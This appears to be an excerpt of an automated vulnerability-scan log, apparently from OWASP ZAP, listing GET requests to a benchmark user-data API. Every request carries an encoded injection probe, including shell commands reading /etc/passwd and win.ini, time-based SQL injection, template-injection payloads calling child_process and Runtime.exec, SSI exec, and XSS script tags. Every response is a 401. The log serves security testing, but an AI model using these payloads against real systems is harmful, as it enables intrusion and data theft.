* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=https%253A%252F%252F1498374535918995670%25252eowasp%25252eorg&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=https%253A%252F%252F1498374535918995670.owasp.org&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=response.write%252868%252C931*937%252C386%2529&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522%2526cat+%252Fetc%252Fpasswd%2526%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522%2526sleep+15.0%2526%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522%2526timeout+%252FT+15.0%2526%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522%253Bget-help&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522%253Bsleep+15.0%253B%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522%253Bstart-sleep+-s+15.0&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522%257Ctimeout+%252FT+15.0&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522+%252F+sleep%252815%2529+%252F+%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522+UNION+ALL+select+NULL+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2526cat+%252Fetc%252Fpasswd%2526&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2526sleep+15.0%2526&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2526timeout+%252FT+15.0&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2526type+%2525SYSTEMROOT%2525%255Cwin.ini&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%2526cat+%252Fetc%252Fpasswd%2526%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%2526sleep+15.0%2526%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%2526timeout+%252FT+15.0%2526%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%2528&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%2529+UNION+ALL+select+NULL+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%253Bget-help&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%253Bsleep+15.0%253B%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%253Bstart-sleep+-s+15.0&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%257Ctimeout+%252FT+15.0&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527+%252F+sleep%252815%2529+%252F+%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527+AND+%25271%2527%253D%25271%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527+AND+%25271%2527%253D%25272%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527+OR+%25271%2527%253D%25271%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527+UNION+ALL+select+NULL+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2529+UNION+ALL+select+NULL+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%253B&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%253Bcat+%252Fetc%252Fpasswd%253B&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%253Bget-help&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%253Bget-help+%2523&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%253Bsleep+15.0%253B&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%253Bstart-sleep+-s+15.0&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%253Bstart-sleep+-s+15.0+%2523&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%257Ctimeout+%252FT+15.0&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2522%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2522%252Bresponse.write%2528798%252C383*389%252C752%2529%252B%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2522&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2522java.lang.Thread.sleep%2522%252815000%2529&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2523%257B%2525x%2528sleep+15%2529%257D&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
